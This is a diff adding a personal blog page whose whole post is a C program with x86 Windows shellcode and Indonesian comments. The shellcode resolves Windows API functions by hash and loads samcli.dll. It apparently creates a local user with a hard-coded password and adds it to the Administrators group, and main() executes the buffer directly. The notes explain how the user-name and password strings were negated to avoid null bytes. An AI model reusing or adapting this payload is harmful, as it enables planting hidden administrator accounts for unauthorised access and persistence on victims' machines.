@@ -1,0 +1,250 @@
+
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.4.0 -->
+<title>febri's blog</title>
+
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="../main.css"><link type="application/atom+xml" rel="alternate" href="" title="">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/brands.min.css"/>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"/>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/fontawesome.min.css"/>
+<link rel="icon" type="image/x-icon" href="../../img/star.ico">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Libre+Caslon+Text:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Pirata+One&display=swap" rel="stylesheet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Mrs+Saint+Delafield&display=swap" rel="stylesheet">
+</head>
+<style>
+h1.hack{
+    text-transform: uppercase;
+
+
+  font-size:46px;
+  font-family: "Pirata One", system-ui;
+  font-weight: 400;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'Sinaloa Regular';
+  src: url('sinaloa-regular.ttf') format('truetype');
+}
+.footer{
+    position: relative;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    background: #ffffff;
+    text-align: center;
+    color: #3d3d3d;
+}
+
+.icons{
+    padding-top: 1rem;
+}
+
+.icons a{
+    text-decoration: none;
+    font-size: 2rem;
+    margin: 0.2rem;
+    color: #3d3d3d;
+}
+.icons a:hover{
+   color: #84817a;
+}
+.company-name{
+    font-size: 1.6rem;
+    margin-top: 0.5rem;
+}
+
+@media (max-width: 500px){
+    html{
+        font-size: 50%;
+    }
+}    
+
+@media(min-width: 501px) and (max-width: 768px){
+    html{
+    font-size: 50%;
+    }
+}    
+.tulisan p{
+        font-size: 1rem;
+}
+.tanda_tangan {
+  flex-shrink: 0; /* Prevent Chrome, Opera, and Safari from letting these items shrink to smaller than their content's default minimum size. */
+  padding: 30px;
+}
+.tanda_tangan p {
+  position: relative;
+  text-align: center;
+  font: 28.5px/2.70em 'Sinaloa Regular';
+  font-weight: 0;
+  -webkit-font-smoothing: initial;
+/*  letter-spacing: -0.100em;*/
+  line-height: 0.9;
+  text-transform: uppercase;
+  z-index: 1000;
+  margin: 0 auto;
+  display: block;
+  bottom: -5px;
+color:black;
+}
+</style>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="">fnlqxz</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger">
+        <label for="nav-trigger">
+           <span class="menu-icon">
+            <p><i class="fa-solid fa-jedi"></i></p>
+          </span>
+        </label>
+
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name hack" itemprop="name headline">Just a broken code has to be displayed</h1>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><pre>
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt
+
+char shellcode[] = 
+ // tools : 
+ // 1. https://www.rapidtables.com/convert/number/ascii-to-hex.html
+ // 2. https://defuse.ca/online-x86-assembler.htm#disassembly (berharap masih nyala terus toolnya)
+
+    "\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c"
+    "\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04"
+    "\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18"
+    "\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31"
+    "\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75"
+    "\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8"
+    "\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e"
+    "\x0e\xec\xff\x55\x04\x89\x45\x14\x31\xc0\x50\x66\xb8\x6c\x6c\x50\x68\x6c\x69\x2e"
+    "\x64\x68\x73\x61\x6d\x63\x54\xff\x55\x14\x89\xc3\x68\x5e\xdf\x7c\xcd\xff\x55\x04"
+    "\x89\x45\x1c\x68\xd7\x3d\x0c\xc3\xff\x55\x04\x89\x45\x20\x31\xc0\x31\xdb\x43\x50"
+    "\xba\x8e\xff\x8c\xff\xf7\xda\x52\xba\x8c\xff\x90\xff\xf7\xda\x52\xba\x8e\xff\x9e"
+    "\xff\xf7\xda\x52\xba\x8d\xff\x8b\xff\xf7\xda\x52\xba\x92\xff\x96\xff\xf7\xda\x52"
+    "\xba\x93\xff\x96\xff\xf7\xda\x52\xba\xbf\xff\x9b\xff\xf7\xda\x52\x89\x65\x24"
+ 
+
+ //   "\x50"
+ //   "\xba\x88\xff\xff\xff"
+ //   "\xf7\xda\x52"
+
+ 
+ // kalkulasi   : printf "%x\n" $((0x0 - 0x00000069))
+ // hasil       : 0xffffff97
+ /*
+    push eax                            
+    mov edx, 0xffffff97            ; i
+    neg edx                        ;
+    push edx 
+ */   
+    "\x50"
+    "\xba\x97\xff\xff\xff"
+    "\xf7\xda\x52"
+
+ // kalkulasi   : printf "%x\n" $((0x0 - 0x00720062))
+ // hasil       : 0xff8dff9e
+/*
+    mov edx, 0xff8dff9e            ; rb
+    neg edx                        ;
+    push edx
+*/
+    "\xba\x9e\xff\x8d\xff"
+    "\xf7\xda\x52"
+
+ // kalkulasi   : printf "%x\n" $((0x0 - 0x00650066))
+ // hasil       : 0xff9aff9a
+/*
+    mov edx, 0xff9aff9a            ; ef
+    neg edx                        ;
+    push edx
+*/
+    "\xba\x9a\xff\x9a\xff"
+    "\xf7\xda\x52"
+
+
+// ----------------------
+    "\x89\xe1\x89\x4d"
+    "\x28"
+// ----------------------
+
+// setup password
+// f
+    "\x50"
+    "\xba\x9a\xff\xff\xff"
+    "\xf7\xda\x52"
+// eb    
+    "\xba\x9a\xff\x9e\xff"
+    "\xf7\xda\x52"
+// ir
+    "\xba\x97\xff\x8d\xff"
+    "\xf7\xda\x52"
+/*
+    "\xba\x9b\xff\x8d\xff"
+    "\xf7\xda\x52"
+    
+    "\xba\x93\xff\x92\xff"
+    "\xf7\xda\x52"
+
+    "\xba\xad\xff\x8a\xff"
+    "\xf7\xda\x52"
+*/
+    "\x89\xe2"
+
+    "\x50\x53\x50\x50\x53\x50\x52\x51"
+    "\x89\xe1\x50\x54\x51\x53\x50\xff\x55\x1c\x8b\x4d\x28\x51\x89\xe1\x53\x51\x6a\x03"
+    "\xff\x75\x24\x50\xff\x55\x20\x31\xc0\x50\xff\x55\x10";
+
+int main(void)
+{
+       	fprintf(stdout,"Length: %d\n",strlen(shellcode));
+	(*(void(*)()) shellcode)();
+     
+return 0;
+}
+</pre></p>
+
+
+
+    </div>
+
+  </div>
+
+   <footer class="footer">
+        <div class="icons">
+           <a href="https://facebook.com/fnlqxz"><i class="fab fa-facebook"></i></a>
+           <a href="https://www.linkedin.com/in/febriyanto-nugroho/"><i class="fab fa-linkedin"></i></a>
+           <a href="https://instagram.com/fnlqxz"><i class="fab fa-instagram"></i></a>
+           <a href="https://github.com/febnug"><i class="fab fa-github"></i></a>
+<a href="https://stackoverflow.com/users/3649174/febriyanto-nugroho?tab=profile"><i class="fab fa-stack-overflow"></i></a>
+<a href="https://twitter.com"><i class="fab fa-twitter"></i></a>
+            <p class="tulisan">
+                &copy; 2015 - now
+            </p>
+<div class="tanda_tangan">
+<p>febriyanto</p> 
+<p>nugroho</p>
+</div>
+        </div>
+    </footer>
+
+</body></html>
